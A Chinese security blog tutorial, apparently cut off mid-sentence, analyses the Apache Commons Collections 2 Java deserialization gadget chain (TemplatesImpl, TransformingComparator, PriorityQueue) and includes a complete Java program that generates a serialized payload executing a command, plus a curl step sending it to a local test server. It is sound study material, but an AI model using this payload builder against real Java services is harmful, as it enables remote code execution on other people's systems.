<p><a href="https://www.guildhab.top/2020/06/java-rmi-%E5%88%A9%E7%94%A84-%E6%9C%80%E5%9F%BA%E6%9C%AC%E7%9A%84%E4%B8%A4%E6%9D%A1-apache-commons-collections-pop-gadget-chains/">Java 反序列化漏洞(4) – Apache Commons Collections POP Gadget Chains 剖析</a></p>
<p><a href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/">【反序列化漏洞】commons-collections-1 组件</a></p>
<p><a href="https://www.cnblogs.com/yyhuni/p/14777166.html">Java反序列化漏洞Apache CommonsCollections分析</a></p>
<h2 id="Commons-Collections-2"><a href="#Commons-Collections-2" class="headerlink" title="Commons Collections 2"></a>Commons Collections 2</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a href="https://mvnrepository.com/artifact/org.apache.commons/commons-collections4/4.0">CommonsCollections4-4.0</a></p>
<p>jdk1.7 1.8低版本</p>
<p><a href="https://leihehehe.github.io/2021/09/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BYsoserial%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-6/">Java反序列化漏洞之Ysoserial安装配置</a>中的<strong>WebServer环境搭建</strong>章节</p>
<h3 id="复现演示"><a href="#复现演示" class="headerlink" title="复现演示"></a>复现演示</h3><p>首先在Ysoserial中配置：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190531654.png" alt="image-20211126190531654"></p>
<p>运行生成：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190648753.png" alt="image-20211126190648753"></p>
<p>运行我们的webserver：</p>
<p><code>curl &quot;http://localhost:9090/webTest1_Web_exploded/test&quot; --data-binary @payload.ser</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126191106461.png" alt="image-20211126191106461"></p>
<p>即可弹出计算器。</p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="CommonsCollections-2-利用链原理"><a href="#CommonsCollections-2-利用链原理" class="headerlink" title="CommonsCollections 2 利用链原理"></a>CommonsCollections 2 利用链原理</h4><p>在<strong>CommonsCollections2</strong>中，我们将使用<a href="https://leihehehe.github.io/2021/11/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJavassist-8/">javassist</a>在java字节码(.class)中插入命令执行代码，接着用某个重写了<code>loadClass</code>方法的<strong>ClassLoader</strong>来加载我们生成好的字节码(.class文件)，实现执行恶意代码的效果。ClassLoader用双亲委派机制来加载Class。</p>
<h4 id="Javassist生成执行命令的Class"><a href="#Javassist生成执行命令的Class" class="headerlink" title="Javassist生成执行命令的Class"></a>Javassist生成执行命令的Class</h4><p>首先我们先模拟以下<strong>javassist</strong>怎么生成执行命令的字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">//需要创建的class对应一个CtClass, ClassPool是一个容器，包含了各种CtClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//获取一个默认的ClassPool</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> cp.get(javassistTest.class.getName());<span class="comment">//根据反射知识，javassistTest.class是javassistTest instance(object),将javassistTest object的名字放入ClassPool的hashmap中，并返回一个ctClass</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.writeFile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>CtClass cc = cp.get(javassistTest.class.getName());</code></p>
<p>我们知道每个需要修改编辑的Class都需要有一个<strong>CtClass</strong>，所以我们需要为我们需要修改的class创建一个CtClass。此处，我们把javassistTest object放入了ClassPool的hashmap中（表明我们需要修改此类），它会给我们返回一个新的CtClass。</p>
<blockquote>
<p>The <strong>java.lang.Class.getName()</strong> returns the name of the entity (class, interface, array class, primitive type, or void) represented by this Class object, as a String.</p>
</blockquote>
<p>所以我们是在hashmap中放入javassistTest object的名字，然后返回了一个新的CtClass。</p>
<p>当我们得到了这个新的CtClass，我们就可以对字节码进行操作了。</p>
<blockquote>
<p>CtConstructor, <em>makeClassInitializer</em>(). Makes an empty class initializer (static constructor).</p>
</blockquote>
<p><code> cc.makeClassInitializer().insertBefore(cmd)</code>创建了一个static代码块，并把cmd插入到了static代码块前面，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>cc.setName(&quot;Leihehe&quot;);</code>设置了字节码中的类名</p>
<p><code>cc.writeFile();</code>是将字节码保存到文件中。<strong>这时候，我们的字节码编写工作就完成了！</strong></p>
<h4 id="ClassLoader加载字节码"><a href="#ClassLoader加载字节码" class="headerlink" title="ClassLoader加载字节码"></a>ClassLoader加载字节码</h4><p>我们平时写代码的文件都是.java格式，经过编译后，会生成.class文件，也就是字节码。 JVM虚拟机想要执行字节码的话，需要使用<strong>ClassLoader Class</strong>来将这些文件load进JVM，其中的<code>defineClass()</code>方法就是来做这件事的。</p>
<p>下面我们手写一个ClassLoader来加载字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;<span class="comment">//继承ClassLoader</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(String name,<span class="type">byte</span>[] b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(name,b,<span class="number">0</span>,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着， 我们在之前的<code>javassistTest </code> Class里添加以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">TestClassLoader</span>(javassistTest.class.getClassLoader()).g(<span class="literal">null</span>,classBytes).newInstance();</span><br></pre></td></tr></table></figure>

<p><code>TestClassLoader(javassistTest.class.getClassLoader())</code>加载了字节码，<code>g()</code>将bytes[]类型的字节码转换成了一个Class instance，但Class instance中的内容并不会主动执行(static代码区)和初始化，所以我们需要使用newInstance()手动触发。</p>
<p><strong>效果：</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126223902264.png" alt="image-20211126223902264"></p>
<h4 id="TemplateImpl类及其利用链"><a href="#TemplateImpl类及其利用链" class="headerlink" title="TemplateImpl类及其利用链"></a>TemplateImpl类及其利用链</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>Javassist将Class加载成字节码，并对其执行方法进行修改（例如：插入恶意代码），接着我们将字节码传入A类的变量中。此处的A类能将该变量中的字节码实例化为对象，从而触发其中的static方法。</p>
<p>在CommonsCollections 2利用链中，<strong>TemplateImpl Class</strong>就是我们payload构造的起点。<strong>TemplateImpl Class</strong>中能将bytecodes变量用<strong>Classloader</strong> load并执行：</p>
<p>接下来，我们先来倒着分析一下：我们首先需要找到可以执行漏洞的地方。</p>
<h5 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127154940678.png" alt="image-20211127154940678"></p>
<p>通过观察上图<code>defineTransletClasses()</code>中的内容，我们可以发现此处创建了一个新的<strong>TransletClassLoader instance</strong>，并返回到变量<strong>loader</strong>。因为最后一行要访问<code>_tfactory.getEcternalEctensionMap()</code>，所以如果我们需要call这个方法的话，需要设置<code>_tfactory</code>的值，因其为<strong>TransformerFactoryImpl</strong>类型，所以我们new一个就可以了，</p>
<h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><p>接着这下面又有一段代码</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127214801875.png" alt="image-20211127214801875"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上图中，<code>loader.defineClass(_bytecodes[i]);</code>将字节码**_bytecodes<strong>传入</strong>loader** - 加载字符码。需要注意的是，我们的字节码的super class必须是AbstractTranslet类。</p>
<p>那么我们要如何才能<strong>触发defineTransletClasses -&gt; loader.defineClass呢？</strong></p>
<h5 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png" alt="image-20211127161222841">接着我们可以通过<code>getTranslateInstance()</code>来call到<code>defineTransletClasses()</code> - 当<code>_class</code>为空时，<code>defineTransletClasses()</code>会被执行。而之后 <code>.newInstance()</code>创建了instance，执行命令。但要想要执行到<code>newInstance()</code>,我们需要满足<code>_name != null</code></p>
<p>那么哪里又可以call到**getTransletInstance()**呢？</p>
<h5 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h5><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212356132.png" alt="image-20211127212356132"></p>
<h5 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h5><p>同样在<strong>TransformerImpl</strong>类的<code>getOutputProperties()</code>方法中发现newTransformer()被call了<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212511457.png" alt="image-20211127212511457"></p>
<h5 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h5><p>因此我们可以总结出，完整的利用链：</p>
<blockquote>
<p>TemplatesImpl.getOutputProperties()<br>TemplatesImpl.newTransformer()<br> TemplatesImpl.getTransletInstance()<br>     TemplatesImpl.defineTransletClasses()<br>         TransletClassLoader.defineClass()</p>
</blockquote>
<p><code>newTransformer()</code>也可作为利用链的开端</p>
<p>经过分析，我们只需要给<strong>TransletImpl</strong>类给以下的attributes赋值：</p>
<ul>
<li><strong>_bytecodes(恶意字节码)</strong></li>
<li><strong>_class(null)</strong></li>
<li><strong>_name(任意非空字符串)</strong></li>
<li><strong>_tfactory(new TransformerFactoryImpl())</strong></li>
</ul>
<p>同时，我们的字节码Class需要继承<strong>AbstractTranslet</strong>类</p>
<p>最后call <code>TemplatesImpl.getOutputProperties()</code>即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TempTest</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">//必须继承AbstractTranslet</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, ClassNotFoundException, NoSuchFieldException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="comment">/*构造恶意代码，并使用javassist生成字节码*/</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//得到默认classPool</span></span><br><span class="line">        <span class="keyword">final</span> CtClass ctClass= classPool.get(TempTest.class.getName());<span class="comment">//从ClassPool中获取属于TempTest的CtClass</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;LeiheheTest&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*创建TemplatesImpl对象*/</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">temp</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<span class="comment">//获取TemplatesImpl的Class类</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*修改_name*/</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templates,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">/*修改_class*/</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*修改_bytecodes*/</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*修改_tfactory*/</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_tfactory</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*call利用链的第一条来触发漏洞*/</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//templates.getOutputProperties(); //这条也可触发</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127215336783.png" alt="image-20211127215336783"></p>
<h3 id="CommonsCollections-2-利用链分析"><a href="#CommonsCollections-2-利用链分析" class="headerlink" title="CommonsCollections 2 利用链分析"></a>CommonsCollections 2 利用链分析</h3><p>经过上面的分析，我们已经知道了TemplateImpl类的利用链，只要我们找到能够call到利用链第一条<code>newTransfomer()</code>的地方，我们就可以找到反序列化点。</p>
<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code>的<code>compare</code> 方法可以触发transform()方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到这个transform()想起了什么？我们可以控制<code>transformer</code>的内容，然后执行<code>InvokerTransformer</code>的<code>transform()</code>方法。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>在cc1里，我们就分析过<code>InvokerTransformer</code>，不妨再来回顾一遍，加深记忆。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//此处是关键</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//此处是关键</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//此处是关键</span></span><br><span class="line">        &#125; </span><br><span class="line">        ...<span class="comment">//此处省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer</code>中就有一个<code>transform()</code>的方法，如果传入的<code>input</code>不为空，那么我们就会依次获取<code>input</code>的Class类、<code>input</code>的某个method，并call我们获取到的方法。</p>
<p>那么在<code>InvokerTransformer</code>中，我们将<code>TemplateImpl</code>类的<code>object</code>作为<code>input</code>传进<code>transform()</code>方法里去就能成功触发了。</p>
<p>总结一下：我们可以通过 <code>TransformingComparator.compare()</code> 执行<code>InvokerTransformer</code>的<code>transform(我们的TemplateIml object)</code>，再执行<code>TemplateImpl</code>的<code>newTransformer()</code>方法</p>
<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><p>利用链中用到了<code>PriorityQueue</code>来触发<code>TransformingComparator</code>.</p>
<p>因为我们传入的序列化对象就是PriorityQueue，所以我们先从readObject()开始分析。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128194719960.png" alt="image-20211128194719960"></p>
<p>我们可以看到，queue中的元素会被反序列化，然后元素会被处理为二叉树类型 -&gt; **heapify()**。</p>
<h5 id="heapify"><a href="#heapify" class="headerlink" title="heapify()"></a>heapify()</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)<span class="comment">//无符号右移1位</span></span><br><span class="line">        siftDown(i, (E) queue[i]);<span class="comment">//将queue中的元素传入siftDown</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法会寻找最后一个非叶子节点，然后使用siftDown方法。 需要注意的是，该处的size必须为2，因为当size为1时，<code>siftDown()</code>不会被call</p>
<h5 id="shiftDown"><a href="#shiftDown" class="headerlink" title="shiftDown"></a>shiftDown</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法判断comparator是否为空，如果不为空，则进入<code>siftDownUsingComparator()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128195530245.png" alt="image-20211128195530245"></p>
<p>注意x为queue中的元素，如果我们将<strong>comparator</strong>设为<strong>TransformingComparator</strong>，就可以连上之前的链了 - queue中的元素会作为<code>InvokerTransformer</code>的<code>input object</code>！</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211202153617378.png" alt="image-20211202153617378"></p>
<p>再次总结一下：</p>
<ul>
<li>将<strong>comparator</strong>设为<strong>TransformingComparator</strong></li>
<li>在queue中加入两个元素，其中第一个元素为我们构造的<strong>templates</strong></li>
</ul>
<h3 id="Payload构造-1"><a href="#Payload构造-1" class="headerlink" title="Payload构造"></a>Payload构造</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建InvokerTransformer */</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// toString是为了保证在构造反序列化链的过程中不报错，只是起到占位的作用。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建TransformingComparator */</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建PriorityQueue */</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>,comparator);</span><br><span class="line">        <span class="comment">//priorityQueue -&gt; TransformingComparator.compare -&gt; InvokerTransformer.transform</span></span><br><span class="line">        queue.add(templates);<span class="comment">//add elements</span></span><br><span class="line">        queue.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;n&quot;</span>));</span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);<span class="comment">//需要在最后一步修改，否则出错</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码中，我们将反射方法写在两个method  - <code>setFieldValue()</code>和<code>getField()</code>中，方便使用。</p>
<h3 id="几个问题"><a href="#几个问题" class="headerlink" title="几个问题"></a>几个问题</h3><ol>
<li><p><strong>为什么在创建<code>InvokerTransformer</code>的时候，不直接通过constructor定义<code>iMethodName</code>为<code>newTransformer</code>？</strong></p>
<p>刚开始我也没搞明白，后来试了试，发现如果在创建<code>InvokerTransformer</code>的时候就修改method名字的话，在执行到<code>queue.add(1)</code>时会报错，如下图</p>
